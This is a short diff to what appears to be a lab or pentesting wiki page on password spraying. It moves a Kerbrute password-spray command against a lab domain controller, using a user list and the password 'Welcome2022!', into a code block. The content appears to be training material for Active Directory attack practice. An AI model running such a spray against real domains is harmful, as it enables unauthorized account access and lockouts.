@@ -33,7 +33,9 @@ Password spraying is a type of brute force attack. An attacker will try a defaul
 
 {% tabs %}
 {% tab title="Kerbrute" %}
-`./kerbrute_linux_amd64 passwordspray -d amsterdam.bank.local --dc 10.0.0.3 ~/adlab/users.txt 'Welcome2022!'`
+```
+./kerbrute_linux_amd64 passwordspray -d amsterdam.bank.local --dc 10.0.0.3 ~/adlab/users.txt 'Welcome2022!'
+```
 {% endtab %}
 
 {% tab title="Spray" %}
